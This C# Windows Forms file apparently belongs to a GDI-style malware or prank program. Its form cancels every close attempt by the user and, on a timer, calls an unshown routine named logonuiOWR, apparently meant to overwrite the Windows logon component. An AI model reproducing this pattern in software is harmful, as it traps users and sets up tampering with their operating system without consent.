using System;
using System.Drawing;
using System.Windows.Forms;

namespace gdifuncs
{
	
	public partial class majorsgui : Form
	{
		public majorsgui()
		{
		
			InitializeComponent();
			
		}
		void MajorsguiLoad(object sender, EventArgs e)
		{
			this.TransparencyKey = Color.Red;
			timer1.Start();
		}
		bool isInjected = false;
		bool draging = false;
		void PictureBox1Click(object sender, EventArgs e)
		{
	
		}
		Point pointClicked;
		void PictureBox1MouseDown(object sender, MouseEventArgs e)
		{
	 if (e.Button == MouseButtons.Left)
            {
                draging = true;
                pointClicked = new Point(e.X, e.Y);
            }
            else
            {
                draging = false;
            }
		}
		void PictureBox1MouseUp(object sender, MouseEventArgs e)
		{
	draging = false;
		}
			protected override void OnFormClosing(FormClosingEventArgs e)
{
  switch (e.CloseReason)
  {
    case CloseReason.UserClosing:
  		e.Cancel = true;
      break;
  }

  base.OnFormClosing(e);
}
			
		void PictureBox1MouseMove(object sender, MouseEventArgs e)
		{
	if (draging)
            {
                Point pointMoveTo;
                pointMoveTo = this.PointToScreen(new Point(e.X, e.Y));
                pointMoveTo.Offset(-pointClicked.X, -pointClicked.Y);
                this.Location = pointMoveTo;

            }
		}
		int deststarted = 0;
		int alrdyfed = 0;
		void Timer1Tick(object sender, EventArgs e)
		{
	
			
			pictureBox6.Size = new Size(pictureBox6.Size.Width, pictureBox6.Size.Height + 1);
		
			if (pictureBox6.Size.Height > 330 && alrdyfed == 0) {
				alrdyfed = 1;
				
				protection64.logonuiOWR();
			}
			
		}
		void flogon(object state) {
				protection64.logonuiOWR();
		}
		void Timer2Tick(object sender, EventArgs e)
		{
			//protection64.logonuiOWR();
		}
		
		
		
		
	}
}
